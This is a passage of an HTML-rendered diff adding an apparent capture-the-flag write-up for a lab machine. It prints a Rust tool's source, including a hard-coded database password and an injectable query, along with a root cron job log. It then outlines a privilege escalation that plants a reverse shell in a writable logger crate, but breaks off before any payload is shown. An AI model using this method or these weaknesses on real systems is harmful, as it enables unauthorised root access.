+<span class="w">        </span><span class="n">pull_indeces</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">source</span><span class="p">);</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;[+] Pull complete.&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Enter keywords to perform the query:&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">keywords</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
+<span class="w">    </span><span class="n">io</span><span class="p">::</span><span class="n">stdin</span><span class="p">().</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">keywords</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="n">trim</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;[-] No keywords selected.</span><span class="se">\n\n</span><span class="s">[-] Quitting...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Justification for the search:&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">justification</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
+<span class="w">    </span><span class="n">io</span><span class="p">::</span><span class="n">stdin</span><span class="p">().</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">justification</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+
+<span class="w">    </span><span class="c1">// Get Username</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Command</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;/usr/bin/whoami&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">output</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="n">expect</span><span class="p">(</span><span class="s">&quot;nobody&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span><span class="p">::</span><span class="n">from_utf8</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">stdout</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">username</span><span class="p">.</span><span class="n">trim</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">justification</span><span class="p">.</span><span class="n">trim</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;[-] No justification provided. TipNet is under 702 authority; queries don&#39;t need warrants, but need to be justified. This incident has been logged and will be reported.&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="n">as_str</span><span class="p">().</span><span class="n">trim</span><span class="p">(),</span><span class="w"> </span><span class="s">&quot;Attempted to query TipNet without justification.&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="n">as_str</span><span class="p">().</span><span class="n">trim</span><span class="p">(),</span><span class="w"> </span><span class="n">justification</span><span class="p">.</span><span class="n">as_str</span><span class="p">());</span>
+
+<span class="w">    </span><span class="n">search_sigint</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="n">as_str</span><span class="p">().</span><span class="n">trim</span><span class="p">());</span>
+
+<span class="p">}</span>
+
+<span class="k">fn</span><span class="w"> </span><span class="nf">get_mode</span><span class="p">()</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
+
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">mode</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>
+
+<span class="w">                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Select mode of usage:&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="fm">print!</span><span class="p">(</span><span class="s">&quot;a) Upstream </span><span class="se">\n</span><span class="s">b) Regular (WIP)</span><span class="se">\n</span><span class="s">c) Emperor (WIP)</span><span class="se">\n</span><span class="s">d) SQUARE (WIP)</span><span class="se">\n</span><span class="s">e) Refresh Indeces</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+<span class="w">                </span><span class="n">io</span><span class="p">::</span><span class="n">stdin</span><span class="p">().</span><span class="n">read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">mode</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+
+<span class="w">                </span><span class="k">match</span><span class="w"> </span><span class="n">mode</span><span class="p">.</span><span class="n">trim</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="s">&quot;a&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                              </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[+] Upstream selected&quot;</span><span class="p">);</span>
+<span class="w">                              </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;upstream&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="s">&quot;b&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                              </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[+] Muscular selected&quot;</span><span class="p">);</span>
+<span class="w">                              </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;regular&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="s">&quot;c&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                              </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[+] Tempora selected&quot;</span><span class="p">);</span>
+<span class="w">                              </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;emperor&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="s">&quot;d&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[+] PRISM selected&quot;</span><span class="p">);</span>
+<span class="w">                                </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;square&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="s">&quot;e&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[!] Refreshing indeces!&quot;</span><span class="p">);</span>
+<span class="w">                                </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;pull&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="s">&quot;q&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="s">&quot;Q&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[-] Quitting&quot;</span><span class="p">);</span>
+<span class="w">                                </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[!] Invalid mode: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">);</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">mode</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">fn</span><span class="w"> </span><span class="nf">connect_to_db</span><span class="p">(</span><span class="n">db</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Result</span><span class="o">&lt;</span><span class="n">mysql</span><span class="p">::</span><span class="n">PooledConn</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pool</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="n">get_conn</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">conn</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">fn</span><span class="w"> </span><span class="nf">search_sigint</span><span class="p">(</span><span class="n">conn</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="n">mysql</span><span class="p">::</span><span class="n">PooledConn</span><span class="p">,</span><span class="w"> </span><span class="n">keywords</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">keywords</span><span class="p">:</span><span class="w"> </span><span class="nb">Vec</span><span class="o">&lt;&amp;</span><span class="kt">str</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot; &quot;</span><span class="p">).</span><span class="n">collect</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span><span class="p">::</span><span class="n">from</span><span class="p">(</span><span class="s">&quot;SELECT timestamp, target, source, data FROM SIGINT WHERE &quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">keyword</span><span class="p">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">enumerate</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">query</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&quot;OR &quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">query</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="o">&amp;</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;data LIKE &#39;%{}%&#39; &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">keyword</span><span class="p">));</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">selected_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="n">query_map</span><span class="p">(</span>
+<span class="w">        </span><span class="n">query</span><span class="p">,</span>
+<span class="w">        </span><span class="o">|</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="o">|</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">Entry</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">timestamp</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="p">}</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">).</span><span class="n">expect</span><span class="p">(</span><span class="s">&quot;Query failed.&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">selected_entries</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;[{}] {} ===&gt; {} | {}&quot;</span><span class="p">,</span>
+<span class="w">                 </span><span class="n">e</span><span class="p">.</span><span class="n">timestamp</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="n">data</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">fn</span><span class="w"> </span><span class="nf">pull_indeces</span><span class="p">(</span><span class="n">conn</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="n">mysql</span><span class="p">::</span><span class="n">PooledConn</span><span class="p">,</span><span class="w"> </span><span class="n">directory</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">paths</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span><span class="p">::</span><span class="n">read_dir</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="n">filter_map</span><span class="p">(</span><span class="o">|</span><span class="n">entry</span><span class="o">|</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="n">ok</span><span class="p">())</span>
+<span class="w">        </span><span class="p">.</span><span class="n">filter</span><span class="p">(</span><span class="o">|</span><span class="n">entry</span><span class="o">|</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="n">path</span><span class="p">().</span><span class="n">extension</span><span class="p">().</span><span class="n">unwrap_or_default</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;txt&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="n">entry</span><span class="o">|</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="n">path</span><span class="p">());</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">stmt_select</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="n">prep</span><span class="p">(</span><span class="s">&quot;SELECT hash FROM tip_submissions WHERE hash = :hash&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">stmt_insert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="n">prep</span><span class="p">(</span><span class="s">&quot;INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Utc</span><span class="p">::</span><span class="n">now</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">paths</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span><span class="p">::</span><span class="n">read_to_string</span><span class="p">(</span><span class="n">path</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Sha256</span><span class="p">::</span><span class="n">digest</span><span class="p">(</span><span class="n">contents</span><span class="p">.</span><span class="n">as_bytes</span><span class="p">());</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">hash_hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex</span><span class="p">::</span><span class="n">encode</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span>
+
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">existing_entry</span><span class="p">:</span><span class="w"> </span><span class="nb">Option</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="n">exec_first</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stmt_select</span><span class="p">,</span><span class="w"> </span><span class="n">params</span><span class="o">!</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">&quot;hash&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hash_hex</span><span class="w"> </span><span class="p">}).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">existing_entry</span><span class="p">.</span><span class="n">is_none</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="s">&quot;%Y-%m-%d&quot;</span><span class="p">).</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;[+] {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">contents</span><span class="p">);</span>
+<span class="w">            </span><span class="n">conn</span><span class="p">.</span><span class="n">exec_drop</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stmt_insert</span><span class="p">,</span><span class="w"> </span><span class="n">params</span><span class="o">!</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="s">&quot;timestamp&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">date</span><span class="p">,</span>
+<span class="w">                </span><span class="s">&quot;data&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">contents</span><span class="p">,</span>
+<span class="w">                </span><span class="s">&quot;hash&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hash_hex</span><span class="p">,</span>
+<span class="w">                </span><span class="p">},</span>
+<span class="w">                </span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="s">&quot;ROUTINE&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot; - &quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Pulling fresh submissions into database.&quot;</span><span class="p">);</span>
+
+<span class="p">}</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql<span class="w"> </span>-u<span class="w"> </span>tipnet<span class="w"> </span>-D<span class="w"> </span>Upstream<span class="w"> </span>-p
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:/opt/crates/logger/src$<span class="w"> </span>cat<span class="w"> </span>lib.rs
+</pre></div>
+</div>
+<div class="highlight-rust notranslate"><div class="highlight"><pre><span></span><span class="k">extern</span><span class="w"> </span><span class="k">crate</span><span class="w"> </span><span class="n">chrono</span><span class="p">;</span>
+
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">io</span><span class="p">::</span><span class="n">Write</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">chrono</span><span class="p">::</span><span class="n">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+
+<span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">log</span><span class="p">(</span><span class="n">user</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">query</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">justification</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Local</span><span class="p">::</span><span class="n">now</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="s">&quot;%Y-%m-%d %H:%M:%S&quot;</span><span class="p">).</span><span class="n">to_string</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">log_message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">timestamp</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">query</span><span class="p">,</span><span class="w"> </span><span class="n">justification</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">OpenOptions</span><span class="p">::</span><span class="n">new</span><span class="p">().</span><span class="n">append</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="n">create</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/opt/tipnet/access.log&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">file</span><span class="p">,</span>
+<span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Error opening log file: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">};</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file</span><span class="p">.</span><span class="n">write_all</span><span class="p">(</span><span class="n">log_message</span><span class="p">.</span><span class="n">as_bytes</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Error writing to log file: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">2023</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">16</span> <span class="mi">10</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">01</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>    <span class="n">PID</span><span class="o">=</span><span class="mi">5531</span>   <span class="o">|</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span> <span class="o">&amp;&amp;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">echo</span> <span class="s2">&quot;e&quot;</span> <span class="o">|</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">atlas</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">cargo</span> <span class="n">run</span> <span class="o">--</span><span class="n">offline</span>
+</pre></div>
+</div>
+<p>So this is ran by a cron job in <code class="docutils literal notranslate"><span class="pre">e</span></code> mode which is <code class="docutils literal notranslate"><span class="pre">pull</span></code> mode, <code class="docutils literal notranslate"><span class="pre">pull</span></code> mode calls <code class="docutils literal notranslate"><span class="pre">pull_indeces()</span></code> which in turn pulls the logger, and <code class="docutils literal notranslate"><span class="pre">silentobserver</span></code> has write access into the logger.<br />
+So we just have to drop a <a class="reference external" href="https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs">revshell</a> inside the logger:</p>
+<div class="highlight-rust notranslate"><div class="highlight"><pre><span></span><span class="k">extern</span><span class="w"> </span><span class="k">crate</span><span class="w"> </span><span class="n">chrono</span><span class="p">;</span>
+
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
